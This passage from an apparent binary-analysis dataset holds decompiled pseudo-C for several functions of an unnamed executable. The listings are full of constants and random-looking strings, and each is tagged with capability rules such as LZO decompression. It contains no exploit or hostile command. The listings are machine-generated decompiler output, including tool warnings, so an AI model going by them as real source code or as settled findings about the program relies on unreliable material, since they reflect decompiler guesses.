piVar4[0xc] = 0;\n    piVar4[0x14] = 0x1339;\n    var_10h = 0xffffffff;\n    *(puVar1 + -0x84) = 0x438c17;\n    fcn.004042c8(*(puVar1 + -0x80));\n    puVar2 = var_ach;\n    *(var_ach + -4) = 0x438c2a;\n    fcn.00403b02();\n    var_c8h = puVar2;\n    var_bch = puVar2 + -0x58;\n    var_c4h = puVar2 + -0x58;\n    var_c0h = puVar2 + -0x3c;\n    *(puVar2 + -0x5c) = \"oawm\";\n    *(puVar2 + -0x60) = 0x438c5e;\n    fcn.00401e79(*(puVar2 + -0x5c));\n    var_10h = 7;\n    *(puVar2 + -0x60) = \"abmaaugdontxeexsorrsxuvnphahpxsfujmfycrotvhuukareb\";\n    *(puVar2 + -100) = 0x438c7b;\n    fcn.00401e79(*(puVar2 + -0x60));\n    puVar1 = var_c4h;\n    var_c4h[0x18] = 1;\n    *(puVar1 + 0x34) = 0x16a2;\n    *(puVar1 + 0x3c) = 0x40e9b880;\n    *(puVar1 + 0x38) = 0;\n    *(puVar1 + 0x44) = 0x409d6800;\n    *(puVar1 + 0x40) = 0;\n    *(puVar1 + 0x4c) = 0x40de16c0;\n    *(puVar1 + 0x48) = 0;\n    *(puVar1 + 0x54) = 0x40ca7d80;\n    *(puVar1 + 0x50) = 0;\n    var_10h = 0xffffffff;\n    *(puVar2 + -100) = 0x438cd8;\n    fcn.004020fe(*(puVar2 + -0x60));\n    puVar1 = var_c8h;\n    var_e0h = var_c8h;\n    *(var_c8h + -4) = var_c8h;\n    var_d4h = puVar1 + -0x6c;\n    var_dch = puVar1 + -0x6c;\n    var_d8h = puVar1 + -0x1c;\n    *(puVar1 + -0x70) = \"jsretzlmxhqckq\";\n    *(puVar1 + -0x74) = 0x438d15;\n    fcn.00401e79(*(puVar1 + -0x70));\n    var_d0h = var_d4h + 0x28;\n    var_10h = 8;\n    *(puVar1 + -0x74) = 0x54bdd0;\n    *(puVar1 + -0x78) = 0x438d3b;\n    fcn.00401e79(*(puVar1 + -0x74));\n    var_10h = 9;\n    *(puVar1 + -0x78) = \"gquknwqybvrhkkbmfdxkahsxcmhrxpndbctecrrluqbaeoppyoafvtjoklwbuybrqpmqfmrrca\";\n    *(puVar1 + -0x7c) = 0x438d60;\n    fcn.00401e79(*(puVar1 + -0x78));\n    puVar3 = var_dch;\n    *var_dch = 0xd87;\n    puVar3[1] = 0x1950;\n    puVar3[8] = 4;\n    *(puVar3 + 9) = 0;\n    puVar3[0x11] = 0x40cbe080;\n    puVar3[0x10] = 0;\n    puVar3[0x13] = 0x40eb93c0;\n    puVar3[0x12] = 0;\n    *(puVar3 + 0x1a) = 0;\n    var_10h = 0xffffffff;\n    *(puVar1 + -0x7c) = 0x438db2;\n    fcn.0040123f(*(puVar1 + -0x78));\n    puVar1 = var_e0h;\n    puVar7 = var_e0h + -0x18;\n    puVar8 = var_e0h + -0x18;\n    *(var_e0h + -8) = 0x40affe00;\n    *(puVar1 + -0xc) = 0;\n    *(puVar1 + -0x10) = 0x40e3bd80;\n    *(puVar1 + -0x14) = 0;\n    *(puVar1 + -4) = 0;\n    *puVar7 = 0xfb0;\n    *(puVar1 + -0x1c) = 0x438df0;\n    fcn.004036b1(*puVar8, *(puVar1 + -0x14), *(puVar1 + -0x10), *(puVar1 + -0xc), *(puVar1 + -8), *(puVar1 + -4));\n    var_10ch = puVar1 + -0x3c;\n    var_104h = puVar1 + -0x3c;\n    *(puVar1 + -0x1c) = 0x40def200;\n    *(puVar1 + -0x20) = 0;\n    *(puVar1 + -0x28) = 0x40e688c0;\n    *(puVar1 + -0x2c) = 0;\n    *(puVar1 + -0x24) = 0x199a;\n    *(puVar1 + -0x30) = 0;\n    *(puVar1 + -0x34) = 0xf7d;\n    *(puVar1 + -0x38) = 0x21e9;\n    *(puVar1 + -0x3c) = 0;\n    *(puVar1 + -0x40) = 0x438e43;\n    fcn.00401262(*(puVar1 + -0x3c), *(puVar1 + -0x38), *(puVar1 + -0x34), *(puVar1 + -0x30), *(puVar1 + -0x2c), \n                 *(puVar1 + -0x28), *(puVar1 + -0x24), *(puVar1 + -0x20));\n    var_108h = puVar1 + -0x58;\n    *(puVar1 + -0x5c) = \"czsuyauxagqtrcnqbvpvhabcknarrufuimujnvaypmaumsda\";\n    *(puVar1 + -0x60) = 0x438e69;\n    fcn.00401e79(*(puVar1 + -0x5c));\n    *var_108h = 0;\n    *(puVar1 + -0x60) = 0x438e7a;\n    fcn.00401aeb(*(puVar1 + -0x5c));\n    puVar1 = var_104h;\n    puVar9 = var_104h + -0x10;\n    puVar10 = var_104h + -0x10;\n    var_fch = var_104h + -0x10;\n    *(var_104h + -0xc) = 0x40dda980;\n    *puVar9 = 0;\n    *(puVar1 + -4) = 0x136e;\n    *(puVar1 + -8) = 0xc11;\n    *(puVar1 + -0x14) = 0x438eaa;\n    fcn.00406091(*puVar10, *(puVar1 + -0xc), *(puVar1 + -8), *(puVar1 + -4));\n    *(puVar1 + -0x14) = 0x438eb2;\n    fcn.00404d18();\n    var_100h = puVar1 + -0x30;\n    *(puVar1 + -0x34) = \"lnowdxgukblazkypnpkcqarhsvylvtsfpfjtkhxnwxocvogmzhxouvdgkazgiefbrhxoqytfdoccqwsfaebiynv\";\n    *(puVar1 + -0x38) = 0x438ed8;\n    fcn.00401e79(*(puVar1 + -0x34));\n    puVar3 = var_100h;\n    var_100h[1] = 0x40ba9f00;\n    *puVar3 = 0;\n    *(puVar1 + -0x38) = 0x438ef3;\n    fcn.00401c85(*(puVar1 + -0x34));\n    puVar1 = var_fch;\n    var_f8h = var_fch + -0x30;\n    puVar11 = var_fch + -0x30;\n    var_f0h = var_fch + -0x30;\n    var_f4h = &fcn.004388b0::var_50h;\n    *(var_fch + -0x30) = var_f4h;\n    *(puVar1 + -0xc) = 0x40b70c00;\n    *(puVar1 + -0x10) = 0;\n    *(puVar1 + -0x14) = 0x40d812c0;\n    *(puVar1 + -0x18) = 0;\n    *(puVar1 + -0x24) = 0x40f12a60;\n    *(puVar1 + -0x28) = 0;\n    *(puVar1 + -4) = 1;\n    *(puVar1 + -8) = 0;\n    *(puVar1 + -0x1c) = 0x4aa;\n    *(puVar1 + -0x20) = 0;\n    *(puVar1 + -0x2c) = 0xd7c;\n    *(puVar1 + -0x34) = 0x438f66;\n    fcn.004053c6(*puVar11, *(puVar1 + -0x2c), *(puVar1 + -0x28), *(puVar1 + -0x24), *(puVar1 + -0x20), *(puVar1 + -0x1c)\n                 , *(puVar1 + -0x18), *(puVar1 + -0x14), *(puVar1 + -0x10), *(puVar1 + -0xc), *(puVar1 + -8), \n                 *(puVar1 + -4));\n    *(puVar1 + -0x34) = 0x438f71;\n    fcn.00403b02();\n    var_e4h = puVar1 + -0x8c;\n    var_ech = puVar1 + -0x8c;\n    var_e8h = puVar1 + -0x5c;\n    *(puVar1 + -0x90) = \"jxidamzeihqqezxuihiromlrtjfaryyhlqmoakrlxrfupmtfskuohtxlqxaezfrrzvvafqdfuicwjk\";\n    *(puVar1 + -0x94) = 0x438fa5;\n    fcn.00401e79(*(puVar1 + -0x90));\n    var_10h = 10;\n    *(puVar1 + -0x94) = \"kaeqgzazgjapsbepaocblkm\";\n    *(puVar1 + -0x98) = 0x438fc5;\n    fcn.00401e79(*(puVar1 + -0x94));\n    puVar2 = var_ech;\n    *var_ech = 0;\n    puVar2[4] = 0;\n    *(puVar2 + 8) = 0xc5f;\n    *(puVar2 + 0x28) = 0x40ea3180;\n    *(puVar2 + 0x24) = 0;\n    puVar2[0x2c] = 1;\n    *(puVar2 + 0x4c) = 0x40f403a0;\n    *(puVar2 + 0x48) = 0;\n    *(puVar2 + 0x54) = 0x40d09dc0;\n    *(puVar2 + 0x50) = 0;\n    puVar2[0x58] = 1;\n    *(puVar1 + -0x98) = 0x439018;\n    fcn.004053e4(*(puVar1 + -0x94));\n    puVar1 = var_f0h;\n    var_10h = 0xffffffff;\n    var_120h = var_f0h + -0x2c;\n    puVar12 = var_f0h + -0x2c;\n    puVar13 = var_f0h + -0x2c;\n    var_11ch = var_f0h + -0x2c;\n    *(var_f0h + -4) = 0x40d0b4c0;\n    *(puVar1 + -8) = 0;\n    *(puVar1 + -0x18) = 0x40820000;\n    *(puVar1 + -0x1c) = 0;\n    *(puVar1 + -0x28) = 0x40cd8e80;\n    *puVar12 = 0;\n    *(puVar1 + -0xc) = 0x49a;\n    *(puVar1 + -0x10) = 0;\n    *(puVar1 + -0x14) = 1;\n    *(puVar1 + -0x20) = 0;\n    *(puVar1 + -0x24) = 0x1f68;\n    *(puVar1 + -0x30) = 0x439086;\n    fcn.00404539(*puVar13, *(puVar1 + -0x28), *(puVar1 + -0x24), *(puVar1 + -0x20), *(puVar1 + -0x1c), *(puVar1 + -0x18)\n                 , *(puVar1 + -0x14), *(puVar1 + -0x10), *(puVar1 + -0xc), *(puVar1 + -8));\n    var_110h = puVar1 + -0x6c;\n    var_118h = puVar1 + -0x6c;\n    var_114h = puVar1 + -0x4c;\n    *(puVar1 + -0x70) =\n         \"udmrnazeiilccardlrwiycmsnufknyykpdupphkbdxrqmvrshihkitydqxtdslygwelnsxqjlqenhixndnxigdqrwmcgczx\";\n    *(puVar1 + -0x74) = 0x4390bc;\n    fcn.00401e79(*(puVar1 + -0x70));\n    var_10h = 0xb;\n    *(puVar1 + -0x74) =\n         \"uwwcoisqukdorltmvmtgjsheczgntatamsqcokvvpslygqwyylbsmjywlndyhzpyjooaeubinkbupwonqdhgojpquemlxcls\";\n    *(puVar1 + -0x78) = 0x4390dc;\n    fcn.00401e79(*(puVar1 + -0x74));\n    puVar3 = var_118h;\n    *var_118h = 0x1926;\n    puVar3[1] = 0x1312;\n    puVar3[0xf] = 0x40ea2d20;\n    puVar3[0xe] = 0;\n    *(puVar1 + -0x78) = 0x43910a;\n    fcn.0040248c(*(puVar1 + -0x74));\n    puVar2 = var_11ch;\n    var_130h = var_11ch;\n    *(var_11ch + -4) = var_11ch;\n    var_124h = puVar2 + -0x5c;\n    var_12ch = puVar2 + -0x5c;\n    var_128h = puVar2 + -0x2c;\n    var_10h = 0xffffffff;\n    *(puVar2 + -0x60) = \"zglckfbzjivkxcsuoo\";\n    *(puVar2 + -100) = 0x439150;\n    fcn.00401e79(*(puVar2 + -0x60));\n    var_10h = 0xc;\n    *(puVar2 + -100) = \"oegcsnznywcaceqaonsznbxqmjhduveoighjccbtcovkqezwbuvlzfldutqxohwhjmisxkivvignishxgzc\";\n    *(puVar2 + -0x68) = 0x439170;\n    fcn.00401e79(*(puVar2 + -100));\n    puVar1 = var_12ch;\n    *var_12ch = 1;\n    *(puVar1 + 8) = 0x40eb2000;\n    *(puVar1 + 4) = 0;\n    *(puVar1 + 0xc) = 0x1288;\n    *(puVar1 + 0x2c) = 0x40f0b320;\n    *(puVar1 + 0x28) = 0;\n    puVar1[0x48] = 0;\n    *(puVar1 + 0x50) = 0x40d2fdc0;\n    *(puVar1 + 0x4c) = 0;\n    *(puVar1 + 0x58) = 0x40d1d3c0;\n    *(puVar1 + 0x54) = 0;\n    var_10h = 0xffffffff;\n    *(puVar2 + -0x68) = 0x4391d0;\n    fcn.00403210(*(puVar2 + -100));\n    puVar1 = var_130h;\n    var_140h = var_130h;\n    *(var_130h + -4) = var_130h;\n    var_134h = puVar1 + -0x4c;\n    var_13ch = puVar1 + -0x4c;\n    var_138h = puVar1 + -0x28;\n    *(puVar1 + -0x50) = \"zpzsnwkslmzbtggjqkznarffiesxguwyzkubfghjhitosuublvejwyyzopzpjuvjnqmjqiqbnacncgjujamagyrplawu\";\n    *(puVar1 + -0x54) = 0x43920f;\n    fcn.00401e79(*(puVar1 + -0x50));\n    var_10h = 0xd;\n    *(puVar1 + -0x54) = \"cgqhhzqgjeecfbdivqy\";\n    *(puVar1 + -0x58) = 0x43922f;\n    fcn.00401e79(*(puVar1 + -0x54));\n    puVar3 = var_13ch;\n    *var_13ch = 0x12e8;\n    *(puVar3 + 1) = 0;\n    *(puVar3 + 8) = 1;\n    *(puVar3 + 0xf) = 1;\n    *(puVar3 + 0x10) = 0;\n    puVar3[0x11] = 0x283;\n    *(puVar3 + 0x12) = 1;\n    var_10h = 0xffffffff;\n    *(puVar1 + -0x58) = 0x43926a;\n    fcn.004019b5(*(puVar1 + -0x54));\n    puVar1 = var_140h;\n    puVar14 = var_140h + -8;\n    var_150h = var_140h + -8;\n    var_154h = &fcn.004388b0::var_68h;\n    *(var_140h + -8) = var_154h;\n    *(puVar1 + -4) = 0;\n    *(puVar1 + -0xc) = 0x439291;\n    fcn.00401677(*puVar14, *(puVar1 + -4));\n    *(puVar1 + -0xc) = 0x43929c;\n    fcn.00403b02();\n    var_144h = puVar1 + -0x4c;\n    var_14ch = puVar1 + -0x4c;\n    var_148h = puVar1 + -0x28;\n    *(puVar1 + -0x50) = \"fibaloxcxxadnpbvhfdptkblfiaeafwmzbxopmpuonfpbdollqpfbiozdxgelhpqmcsvmprxawyfxbxvkjwuiysggmn\";\n    *(puVar1 + -0x54) = 0x4392d0;\n    fcn.00401e79(*(puVar1 + -0x50));\n    var_10h = 0xe;\n    *(puVar1 + -0x54) = \"uddrxgmqzv\";\n    *(puVar1 + -0x58) = 0x4392f0;\n    fcn.00401e79(*(puVar1 + -0x54));\n    puVar3 = var_14ch;\n    *var_14ch = 0x1f9;\n    puVar3[2] = 0x40eed1c0;\n    puVar3[1] = 0;\n    puVar3[0x10] = 0x40f4bf90;\n    puVar3[0xf] = 0;\n    *(puVar1 + -0x58) = 0x439325;\n    fcn.00404048(*(puVar1 + -0x54));\n    puVar2 = var_150h;\n    var_168h = var_150h;\n    *(var_150h + -4) = var_150h;\n    var_15ch = puVar2 + -0x60;\n    var_164h = puVar2 + -0x60;\n    var_160h = puVar2 + -0x30;\n    var_10h = 0xffffffff;\n    *(puVar2 + -100) = \"gtlngbgknoxrwn\";\n    *(puVar2 + -0x68) = 0x439369;\n    fcn.00401e79(*(puVar2 + -100));\n    var_158h = var_15ch + 0x18;\n    var_10h = 0xf;\n    *(puVar2 + -0x68) = \"saeqdrcujefksscbpllruoquagdzcvfdbwbkjuztwaivwynwbjwculrvsgafstz\";\n    *(puVar2 + -0x6c) = 0x43938f;\n    fcn.00401e79(*(puVar2 + -0x68));\n    var_10h = 0x10;\n    *(puVar2 + -0x6c) = \"hhrgxopdzxpkcraoyaoipqrgydscbogivxvafomzdntouvhmqyzelrxwvvsilheeujizjya\";\n    *(puVar2 + -0x70) = 0x4393b1;\n    fcn.00401e79(*(puVar2 + -0x6c));\n    puVar1 = var_164h;\n    var_164h[0x48] = 0;\n    puVar1[0x4c] = 0;\n    *(puVar1 + 0x54) = 0x40d00280;\n    *(puVar1 + 0x50) = 0;\n    *(puVar1 + 0x5c) = 0x40c3e880;\n    *(puVar1 + 0x58) = 0;\n    var_10h = 0xffffffff;\n    *(puVar2 + -0x70) = 0x4393ef;\n    fcn.0040297d(*(puVar2 + -0x6c));\n    puVar2 = var_168h;\n    *(var_168h + -4) = 0x439401;\n    fcn.0040180c();\n    var_16ch = puVar2;\n    var_170h = puVar2 + -0x2c;\n    *(puVar2 + -0x30) = \"zgvjonythnvffnqrujhiwxrwxvvhjrryuldsdylfxdmrorycoxhvqfiyekimdknpsm\";\n    *(puVar2 + -0x34) = 0x439424;\n    fcn.00401e79(*(puVar2 + -0x30));\n    puVar1 = var_170h;\n    *(var_170h + 0x1c) = 0x40c18200;\n    *(puVar1 + 0x18) = 0;\n    puVar1[0x20] = 1;\n    *(puVar1 + 0x28) = 0x40e18e60;\n    *(puVar1 + 0x24) = 0;\n    *(puVar2 + -0x34) = 0x439452;\n    fcn.00401ef1(*(puVar2 + -0x30));\n    *in_FS_OFFSET = var_18h;\n    return var_80h;\n}\n",
        "token_count": 8798
    },
    "0043ae80": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t __fastcall fcn.0043ae80(int32_t param_1)\n\n{\n    uint *puVar1;\n    uchar *puVar2;\n    uchar *puVar3;\n    uint *puVar4;\n    uint *puVar5;\n    int32_t *in_FS_OFFSET;\n    char *arg_8h;\n    uint auStack240 [10];\n    uint uStack200;\n    uchar *var_c0h;\n    uint *var_bch;\n    uchar *var_b8h;\n    uchar *var_b4h;\n    uint *var_b0h;\n    uchar *var_ach;\n    uchar *var_a8h;\n    uchar *var_a4h;\n    uchar *var_a0h;\n    uchar *var_9ch;\n    uchar *var_98h;\n    uchar *var_94h;\n    uchar *var_90h;\n    uchar *var_8ch;\n    uchar *var_88h;\n    uchar *var_84h;\n    uchar *var_80h;\n    uchar *var_7ch;\n    uchar *var_78h;\n    uchar *var_74h;\n    uchar *var_70h;\n    uchar *var_6ch;\n    uint *var_68h;\n    uchar *var_64h;\n    uchar *var_60h;\n    uchar *var_5ch;\n    uchar *var_58h;\n    uchar *var_54h;\n    uchar *var_50h;\n    uchar *var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint *var_40h;\n    uint *var_3ch;\n    uint var_38h;\n    int32_t var_20h;\n    uint *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint *puVar6;\n    \n    var_1ch = &fcn.0043ae80::var_c0h;\n    var_40h = &fcn.0043ae80::var_c0h;\n    var_10h = 0xffffffff;\n    var_14h = 0x450b00;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0043ae80::var_18h;\n    var_44h = param_1 + 8;\n    uStack200 = 0x43aec6;\n    var_48h = param_1;\n    var_20h = param_1;\n    fcn.004040a7();\n    var_3ch = &stack0xffffff10;\n    var_10h = 0;\n    arg_8h = \"vdhiqwdettpvrjtvbpwnsdrkaeqxbguatjhhyrprzhzujfxixargkcbkkljcejayhekenabtffrqxczgvyergxmaryhl\";\n    fcn.00401e79(\"vdhiqwdettpvrjtvbpwnsdrkaeqxbguatjhhyrprzhzujfxixargkcbkkljcejayhekenabtffrqxczgvyergxmaryhl\");\n    puVar1 = var_3ch;\n    *var_3ch = 0x1ee9;\n    puVar1[1] = 0x711;\n    puVar1[9] = 0x40cec380;\n    puVar1[8] = 0;\n    puVar1[10] = 0x422;\n    fcn.00401ca8(arg_8h);\n    puVar3 = var_40h;\n    var_54h = var_40h;\n    *(var_40h + -4) = var_40h;\n    var_50h = puVar3 + -0x6c;\n    var_4ch = puVar3 + -0x18;\n    *(puVar3 + -0x70) = \"royhcndtaplugfkgkplsnvicmotlefxnoedrxnmkjlcxgzqmuwhjdklhjspthzo\";\n    *(puVar3 + -0x74) = 0x43af51;\n    fcn.00401e79(*(puVar3 + -0x70));\n    var_58h = var_50h + 0x3c;\n    var_10h = 10;\n    *(puVar3 + -0x74) = \"vlmmlton\";\n    *(puVar3 + -0x78) = 0x43af76;\n    fcn.00401e79(*(puVar3 + -0x74));\n    var_5ch = var_50h + 0x24;\n    var_10h = 0xb;\n    *(puVar3 + -0x78) = \"sajvslpldsecnfadsiuuszbtknqkojcqbxnmrgkjvpusqzumeiixafjqbvmnayjnddawrdewo\";\n    *(puVar3 + -0x7c) = 0x43af9b;\n    fcn.00401e79(*(puVar3 + -0x78));\n    var_10h = 0xc;\n    *(puVar3 + -0x7c) = \"olzm\";\n    *(puVar3 + -0x80) = 0x43afba;\n    fcn.00401e79(*(puVar3 + -0x7c));\n    puVar2 = var_50h;\n    var_50h[0x18] = 0;\n    puVar2[0x1c] = 0;\n    *(puVar2 + 0x20) = 0x36f;\n    var_10h = 0;\n    *(puVar3 + -0x80) = 0x43afe0;\n    fcn.00405f83(*(puVar3 + -0x7c));\n    puVar3 = var_54h;\n    var_64h = var_54h;\n    *(var_54h + -4) = var_54h;\n    var_60h = puVar3 + -0x34;\n    *(puVar3 + -0x38) = \"qhnpojaeigiyumemplfcgnudfdtczamzhkbdccyhcghapnkrswqjpizbg\";\n    *(puVar3 + -0x3c) = 0x43b00d;\n    fcn.00401e79(*(puVar3 + -0x38));\n    puVar2 = var_60h;\n    *var_60h = 1;\n    puVar2[4] = 1;\n    *(puVar2 + 0xc) = 0x40d817c0;\n    *(puVar2 + 8) = 0;\n    *(puVar2 + 0x2c) = 0x409d2c00;\n    *(puVar2 + 0x28) = 0;\n    puVar2[0x30] = 0;\n    *(puVar3 + -0x3c) = 0x43b044;\n    fcn.00402eff(*(puVar3 + -0x38));\n    puVar2 = var_64h;\n    var_6ch = var_64h;\n    *(var_64h + -4) = var_64h;\n    var_68h = puVar2 + -0x3c;\n    *(puVar2 + -0x40) = \"fanpjdzjfnvtgrhwhojxilvlacziydyhtapfghkorhwduixetlhxqtboosg\";\n    *(puVar2 + -0x44) = 0x43b071;\n    fcn.00401e79(*(puVar2 + -0x40));\n    puVar1 = var_68h;\n    *var_68h = 0x5a6;\n    puVar1[1] = 0xf28;\n    puVar1[3] = 0x40bb3700;\n    puVar1[2] = 0;\n    puVar1[4] = 0x337;\n    *(puVar1 + 5) = 0;\n    puVar1[7] = 0x409f2400;\n    puVar1[6] = 0;\n    *(puVar1 + 8) = 1;\n    *(puVar2 + -0x44) = 0x43b0b9;\n    fcn.00406375(*(puVar2 + -0x40));\n    puVar3 = var_6ch;\n    var_78h = var_6ch;\n    *(var_6ch + -4) = var_6ch;\n    var_74h = puVar3 + -0x78;\n    var_70h = puVar3 + -0x2c;\n    *(puVar3 + -0x7c) = 0x54c997;\n    *(puVar3 + -0x80) = 0x43b0e9;\n    fcn.00401e79(*(puVar3 + -0x7c));\n    var_7ch = var_74h + 0x34;\n    var_10h = 7;\n    *(puVar3 + -0x80) = \"atcwkp\";\n    *(puVar3 + -0x84) = 0x43b10e;\n    fcn.00401e79(*(puVar3 + -0x80));\n    var_80h = var_74h + 0x1c;\n    var_10h = 8;\n    *(puVar3 + -0x84) = \"noqxegmxrgcvxjqpjnwljsfbhuguasn\";\n    *(puVar3 + -0x88) = 0x43b133;\n    fcn.00401e79(*(puVar3 + -0x84));\n    var_10h = 9;\n    *(puVar3 + -0x88) = \"ewmllnjmsxgqjepffdesfityvwumtmemzxojqgxubmyguoershinljwuarsnwlkoqu\";\n    *(puVar3 + -0x8c) = 0x43b152;\n    fcn.00401e79(*(puVar3 + -0x88));\n    puVar2 = var_74h;\n    *(var_74h + 0x18) = 0x222d;\n    *(puVar2 + 100) = 0x708;\n    *(puVar2 + 0x68) = 0x184;\n    *(puVar2 + 0x6c) = 0xd17;\n    *(puVar2 + 0x70) = 0x42b;\n    *(puVar2 + 0x74) = 0x413;\n    var_10h = 0;\n    *(puVar3 + -0x8c) = 0x43b193;\n    fcn.00401546(*(puVar3 + -0x88));\n    puVar3 = var_78h;\n    puVar4 = var_78h + -4;\n    var_8ch = var_78h + -4;\n    *(var_78h + -4) = &fcn.0043ae80::var_38h;\n    *(puVar3 + -8) = 0x43b1af;\n    fcn.004054d4(*puVar4);\n    *(puVar3 + -8) = 0x43b1bc;\n    fcn.00403b02();\n    var_88h = puVar3 + -0x60;\n    var_84h = puVar3 + -0x28;\n    *(puVar3 + -100) =\n         \"fynomiwehppsfdghelqxpnjgaqzmntbhjlbldzkqwoqndbguoxwzplsvrddeggcbbzqpntyurbvjotdlhtmhilbftmkdwuxye\";\n    *(puVar3 + -0x68) = 0x43b1ea;\n    fcn.00401e79(*(puVar3 + -100));\n    var_90h = var_88h + 0x18;\n    var_10h = 5;\n    *(puVar3 + -0x68) = \"vcwdlhgzongieppztealsrmyzibceknyqibofnvmpaakwqlgpmpmctiotrvpbyezowaapphnovpdjabstlhxcljar\";\n    *(puVar3 + -0x6c) = 0x43b215;\n    fcn.00401e79(*(puVar3 + -0x68));\n    var_10h = 6;\n    *(puVar3 + -0x6c) = \"xtjpuhtnewewwxxbvnuumzuktdydskqoqgedsvpppohrgufehjgplrstrvtojkjukemggqcoor\";\n    *(puVar3 + -0x70) = 0x43b237;\n    fcn.00401e79(*(puVar3 + -0x6c));\n    puVar2 = var_88h;\n    *(var_88h + 0x34) = 0x40e19c40;\n    *(puVar2 + 0x30) = 0;\n    *(puVar2 + 0x50) = 0xdb2;\n    *(puVar2 + 0x54) = 0xdfc;\n    puVar2[0x58] = 0;\n    var_10h = 0;\n    *(puVar3 + -0x70) = 0x43b271;\n    fcn.00405aec(*(puVar3 + -0x6c));\n    puVar3 = var_8ch;\n    var_9ch = var_8ch;\n    *(var_8ch + -4) = var_8ch;\n    var_98h = puVar3 + -0x6c;\n    var_94h = puVar3 + -0x18;\n    *(puVar3 + -0x70) = \"myerxqllkfpvwleffvlgouqnozfcbqrrwwselhkqitmzvdsolbvivnurieyaglalocjqwnhuezgsilpmij\";\n    *(puVar3 + -0x74) = 0x43b2ad;\n    fcn.00401e79(*(puVar3 + -0x70));\n    var_a0h = var_98h + 0x30;\n    var_10h = 2;\n    *(puVar3 + -0x74) = \"wkgeridyphoiotgckldkfduwstvomatrcxpwtzqlbkmaiaoamxmxqkfcgivopqefgcrowgm\";\n    *(puVar3 + -0x78) = 0x43b2d8;\n    fcn.00401e79(*(puVar3 + -0x74));\n    var_a4h = var_98h + 0x18;\n    var_10h = 3;\n    *(puVar3 + -0x78) = \"gsktwrgwddoypbiluejlgaewfpdmzjymetjqvstjafejukccwnvoleyzc\";\n    *(puVar3 + -0x7c) = 0x43b303;\n    fcn.00401e79(*(puVar3 + -0x78));\n    var_10h = 4;\n    *(puVar3 + -0x7c) = \"mdfmitdtvjiclwgdzdwnhsenyymgffjeswdvgdxqmsuhteixtgnuujqcuwld\";\n    *(puVar3 + -0x80) = 0x43b325;\n    fcn.00401e79(*(puVar3 + -0x7c));\n    puVar2 = var_98h;\n    var_98h[0x48] = 1;\n    *(puVar2 + 0x4c) = 0x7dc;\n    puVar2[0x50] = 0;\n    var_10h = 0;\n    *(puVar3 + -0x80) = 0x43b34e;\n    fcn.00405ec0(*(puVar3 + -0x7c));\n    puVar2 = var_9ch;\n    var_ach = var_9ch;\n    *(var_9ch + -4) = var_9ch;\n    var_a8h = puVar2 + -0x1c;\n    *(puVar2 + -0x20) = \"epgllosjyahrpxpunxdogvnuxyjjmqextlzqczbxs\";\n    *(puVar2 + -0x24) = 0x43b381;\n    fcn.00401e79(*(puVar2 + -0x20));\n    var_a8h[0x18] = 0;\n    *(puVar2 + -0x24) = 0x43b398;\n    fcn.00403855(*(puVar2 + -0x20));\n    puVar2 = var_ach;\n    var_b4h = var_ach;\n    *(var_ach + -4) = var_ach;\n    var_b0h = puVar2 + -0x3c;\n    *(puVar2 + -0x40) = \"swrxssuzbsdjclyaxfsmwzfwt\";\n    *(puVar2 + -0x44) = 0x43b3d0;\n    fcn.00401e79(*(puVar2 + -0x40));\n    puVar1 = var_b0h;\n    var_b0h[1] = 0x40d18800;\n    *puVar1 = 0;\n    *(puVar1 + 2) = 0;\n    puVar1[10] = 0x40d2de00;\n    puVar1[9] = 0;\n    puVar1[0xb] = 0x2209;\n    *(puVar1 + 0xc) = 1;\n    puVar1[0xe] = 0x40b82800;\n    puVar1[0xd] = 0;\n    *(puVar2 + -0x44) = 0x43b41b;\n    fcn.00403dcd(*(puVar2 + -0x40));\n    puVar2 = var_b4h;\n    puVar5 = var_b4h + -0x14;\n    puVar6 = var_b4h + -0x14;\n    *(var_b4h + -0xc) = 0x40c84580;\n    *(puVar2 + -0x10) = 0;\n    *(puVar2 + -4) = 0;\n    *(puVar2 + -8) = 0x442;\n    *puVar5 = 0x1110;\n    *(puVar2 + -0x18) = 0x43b457;\n    fcn.00401c44(*puVar6, *(puVar2 + -0x10), *(puVar2 + -0xc), *(puVar2 + -8), *(puVar2 + -4));\n    *(puVar2 + -0x18) = 0x43b464;\n    fcn.00405e52();\n    var_c0h = puVar2 + -0x18;\n    *(puVar2 + -0x18) = 1;\n    *(puVar2 + -0x1c) = 0x43b477;\n    fcn.00405b8c(*(puVar2 + -0x18));\n    var_bch = puVar2 + -0x6c;\n    var_b8h = puVar2 + -0x30;\n    *(puVar2 + -0x70) = \"madovilwjhbzmfadcvtkrxhovcpkrwewsoceqaukupivozzydbtrfd\";\n    *(puVar2 + -0x74) = 0x43b4a5;\n    fcn.00401e79(*(puVar2 + -0x70));\n    var_10h = 1;\n    *(puVar2 + -0x74) = \"ehkbehlwst\";\n    *(puVar2 + -0x78) = 0x43b4ca;\n    fcn.00401e79(*(puVar2 + -0x74));\n    puVar1 = var_bch;\n    *var_bch = 0x263;\n    *(puVar1 + 1) = 1;\n    *(puVar1 + 2) = 0;\n    puVar1[4] = 0x4089b800;\n    puVar1[3] = 0;\n    *(puVar1 + 5) = 0;\n    puVar1[6] = 0x77f;\n    puVar1[0xe] = 0x40b0ed00;\n    puVar1[0xd] = 0;\n    var_10h = 0;\n    *(puVar2 + -0x78) = 0x43b519;\n    fcn.0040333c(*(puVar2 + -0x74));\n    *in_FS_OFFSET = var_18h;\n    return var_48h;\n}\n",
        "token_count": 4799
    },
    "0043ce50": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
